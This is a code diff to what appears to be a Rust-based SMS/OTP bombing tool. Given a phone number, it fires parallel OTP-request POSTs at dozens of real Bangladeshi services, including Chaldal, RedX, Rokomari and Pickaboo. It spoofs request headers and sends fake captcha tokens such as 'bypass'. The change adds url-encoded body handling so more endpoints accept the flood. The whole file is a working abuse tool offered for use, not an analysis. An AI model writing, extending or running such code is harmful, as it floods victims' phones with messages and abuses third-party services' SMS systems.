@@ -101,12 +101,16 @@ pub fn cors_headers() -> Headers {
     h
 }
 
+// ══════════════════════════════════════════════════════════════════
+//  🔑 KEY FIX: body_str parameter added so each API gets
+//  the correct raw body (JSON string OR url-encoded string)
+// ══════════════════════════════════════════════════════════════════
 async fn fire_once(
-    name:    &'static str,
-    url:     &'static str,
-    payload: &Value,
-    headers: &[(&'static str, &'static str)],
-    seed:    u64,
+    name:     &'static str,
+    url:      &'static str,
+    body_str: String,          // pre-built body string
+    headers:  &[(&'static str, &'static str)],
+    seed:     u64,
 ) -> Value {
     let mut init = RequestInit::new();
     init.with_method(Method::Post);
@@ -151,10 +155,9 @@ async fn fire_once(
     let _ = h.set("Pragma",        "no-cache");
 
     init.with_headers(h);
-    init.with_body(Some(payload.to_string().into()));
+    init.with_body(Some(body_str.into()));
 
     let timeout_wrapped = {
-        let name = name;
         wasm_bindgen_futures::future_to_promise(async move {
             JsFuture::from(sleep_promise(8000)).await.ok();
             Ok(JsValue::from_str(
@@ -192,11 +195,39 @@ async fn fire_once(
 }
 
 async fn fire(
-    name:    &'static str,
-    url:     &'static str,
-    payload: Value,
-    headers: &[(&'static str, &'static str)],
+    name:     &'static str,
+    url:      &'static str,
+    payload:  Value,
+    headers:  &[(&'static str, &'static str)],
 ) -> Value {
+    // ── FIX: detect content-type from headers and build correct body ──
+    let content_type = headers.iter()
+        .find(|(k, _)| k.to_lowercase() == "content-type")
+        .map(|(_, v)| *v)
+        .unwrap_or("application/json");
+
+    let body_str = if content_type.contains("x-www-form-urlencoded") {
+        // Build url-encoded string from JSON object
+        payload.as_object()
+            .map(|obj| {
+                obj.iter()
+                    .map(|(k, v)| {
+                        let val = match v {
+                            Value::String(s) => s.clone(),
+                            Value::Number(n) => n.to_string(),
+                            Value::Bool(b)   => b.to_string(),
+                            other            => other.to_string(),
+                        };
+                        format!("{}={}", k, js_url_encode(&val))
+                    })
+                    .collect::<Vec<_>>()
+                    .join("&")
+            })
+            .unwrap_or_default()
+    } else {
+        payload.to_string()
+    };
+
     let base_seed: u64 = name.bytes()
         .enumerate()
         .fold(0x517cc1b727220a95u64, |acc, (i, b)| {
@@ -209,7 +240,7 @@ async fn fire(
             .wrapping_mul(0x6c62272e07bb0142u64)
         );
 
-        let r      = fire_once(name, url, &payload, headers, seed).await;
+        let r      = fire_once(name, url, body_str.clone(), headers, seed).await;
         let ok     = r["ok"].as_bool().unwrap_or(false);
         let status = r["status"].as_u64().unwrap_or(0);
 
@@ -230,6 +261,20 @@ async fn fire(
     }
 
     json!({"api": name, "status": 0, "ok": false, "err": "all attempts failed"})
+}
+
+// Simple URL encoder (no std::encode available in wasm target)
+fn js_url_encode(s: &str) -> String {
+    let mut out = String::new();
+    for b in s.bytes() {
+        match b {
+            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9'
+            | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
+            b' ' => out.push('+'),
+            _ => out.push_str(&format!("%{:02X}", b)),
+        }
+    }
+    out
 }
 
 macro_rules! parallel {
@@ -297,15 +342,14 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         }).to_string())?.with_headers(headers));
     }
 
-    let number:  &'static str = Box::leak(number_str.clone().into_boxed_str());
-    let bd_no:   &'static str = Box::leak(number_str.trim_start_matches('0').to_string().into_boxed_str());
-    let bd_full: &'static str = Box::leak(format!("880{bd_no}").into_boxed_str());
-    let plus_bd: &'static str = Box::leak(format!("+88{number_str}").into_boxed_str());
+    let number:    &'static str = Box::leak(number_str.clone().into_boxed_str());
+    let bd_no:     &'static str = Box::leak(number_str.trim_start_matches('0').to_string().into_boxed_str());
+    let bd_full:   &'static str = Box::leak(format!("880{bd_no}").into_boxed_str());
+    let plus_bd:   &'static str = Box::leak(format!("+88{number_str}").into_boxed_str());
     let bd_msisdn: &'static str = Box::leak(number_str.trim_start_matches('0').to_string().into_boxed_str());
 
     let api_results = parallel![
 
-        // ── পুরনো সব API (unchanged) ──
         fire("Shadhin Music",
             "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
             json!({"msisdn": bd_full, "shortcode": 16235, "servicename": "Shadhin Music"}),
@@ -704,12 +748,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
             json!({"CellPhone": number, "type": "login"}),
             &[("Content-Type","application/x-www-form-urlencoded")]
         ),
-
-        // ══════════════════════════════════════════════
-        //  🆕 নতুন API গুলো
-        // ══════════════════════════════════════════════
-
-        // PBS Alpha (new endpoint)
         fire("PBS Alpha OTP",
             "https://apialpha.pbs.com.bd/api/OTP/generateOTP",
             json!({"userPhone": number, "otp": ""}),
@@ -720,8 +758,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("x-requested-with","XMLHttpRequest"),
             ]
         ),
-
-        // Sindabad
         fire("Sindabad",
             "https://m2ce.sindabad.com/rest/V1/EasyLogin/isMobileAvailable",
             json!({"websiteId": 1.0, "customerMobile": number}),
@@ -731,8 +767,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("x-requested-with","XMLHttpRequest"),
             ]
         ),
-
-        // Garibook v4
         fire("Garibook",
             "https://api.garibookadmin.com/api/v4/user/login",
             json!({"recaptcha_token": "garibookcaptcha", "mobile": plus_bd, "channel": "web"}),
@@ -744,8 +778,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("X-Requested-With","mark.via.gp"),
             ]
         ),
-
-        // Pickaboo
         fire("Pickaboo",
             "https://www.pickaboo.com/rest/default/V1/customer-check/exist",
             json!({"mobile": number}),
@@ -756,8 +788,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("x-requested-with","mark.via.gp"),
             ]
         ),
-
-        // Bioscope Live
         fire("Bioscope Live",
             "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
             json!({"number": plus_bd}),
@@ -769,8 +799,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("authorization",""),
             ]
         ),
-
-        // Le Reve Craze
         fire("Le Reve Craze",
             "https://www.lerevecraze.com/login/verify_phone",
             json!({"mobile_no": number, "resend": "0", "recaptcha_token": "bypass"}),
@@ -782,8 +810,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("x-requested-with","XMLHttpRequest"),
             ]
         ),
-
-        // Khaas Food
         fire("Khaas Food",
             "https://www.khaasfood.com/api/auth/request-otp",
             json!({"username": number}),
@@ -795,8 +821,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("x-requested-with","mark.via.gp"),
             ]
         ),
-
-        // Beauty Booth (new endpoint)
         fire("Beauty Booth",
             "https://admin.beautybooth.com.bd/api/v2/auth/register-new",
             json!({"signature": 280, "type": "phone", "value": number, "token": 39}),
@@ -807,8 +831,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("x-requested-with","mark.via.gp"),
             ]
         ),
-
-        // Chaldal
         fire("Chaldal",
             "https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey",
             json!({"phoneNumber": plus_bd, "retryAttempt": 0}),
@@ -823,8 +845,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("x-requested-with","mark.via.gp"),
             ]
         ),
-
-        // Shomvob (applicant endpoint)
         fire("Shomvob",
             "https://backend-api.shomvob.co/api/v2/otp/applicant/web/phone/",
             json!({"phone": bd_full, "is_retry": 0}),
@@ -835,8 +855,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("Referer","https://app.shomvob.co/auth/"),
             ]
         ),
-
-        // RedX login code (different endpoint)
         fire("RedX Login",
             "https://api.redx.com.bd/v1/user/request-login-code",
             json!({"callingCode": "+880", "phoneNumber": bd_no, "countryCode": "BD", "service": "redx"}),
@@ -846,8 +864,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("Referer","https://redx.com.bd/"),
             ]
         ),
-
-        // Shwapno
         fire("Shwapno",
             "https://www.shwapno.com/api/auth",
             json!({"phoneNumber": number}),
@@ -857,8 +873,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("x-requested-with","XMLHttpRequest"),
             ]
         ),
-
-        // BD Tickets
         fire("BD Tickets",
             "https://api.bdtickets.com:20100/v1/auth",
             json!({"phoneNumber": plus_bd, "createUserCheck": true, "applicationChannel": "WEB_APP"}),
@@ -868,8 +882,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("Referer","https://bdtickets.com/"),
             ]
         ),
-
-        // Rokomari OTP
         fire("Rokomari",
             "https://www.rokomari.com/otp/send",
             json!({}),
@@ -880,8 +892,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("x-requested-with","XMLHttpRequest"),
             ]
         ),
-
-        // Kirei BD
         fire("Kirei BD",
             "https://frontendapi.kireibd.com/api/v2/send-login-otp",
             json!({"email": number}),
@@ -893,16 +903,6 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
                 ("x-requested-with","XMLHttpRequest"),
             ]
         )
-
-        // ══════════════════════════════════════════════
-        //  নতুন API যোগ করার format:
-        //
-        //  fire("API নাম",
-        //      "https://api.url/endpoint",
-        //      json!({"phone": number}),
-        //      &[("Content-Type","application/json")]
-        //  ),
-        // ══════════════════════════════════════════════
 
     ];
 
